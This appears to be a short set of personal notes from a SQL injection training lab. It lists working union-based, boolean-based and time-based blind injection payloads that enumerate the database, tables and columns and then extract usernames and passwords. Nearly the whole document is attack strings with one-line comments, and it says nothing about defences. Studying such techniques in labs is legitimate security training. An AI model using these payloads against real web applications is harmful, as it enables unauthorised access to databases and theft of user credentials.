# SQL Injection

## Error Based

```
# Find the point of injection
# Find the database
article?id=0 UNION SELECT 1,2, database() #This returns sqli_one
# Find the tables 
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
# Get structure of the databae
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
# Select data
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```



## Boolean Based

```sql
admin123' UNION SELECT 1;-- 
/*Guess the number of columns that are returned*/
admin123' UNION SELECT 1,2,3;-- 
## Then we start guess the name of the database
'admin123' UNION SELECT 1,2,3 where database() like '%';--
'admin123' UNION SELECT 1,2,3 where database() like 's%';--
## Once we have the database name, we start searching for the table name
'admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
## Now once we have the table name, so we try to figure out the column name
'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--
## We need to cycle through for all columns and we need to filter the column names that we have already found
'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
## We needed username and password here, so we can extrapolate this login to get username and password.
'admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
'admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--

```

## Blind 

```sql
'admin123' UNION SELECT SLEEP(5);--
'admin123' UNION SELECT SLEEP(5),2;--
'admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
## We go in the same way as before
```

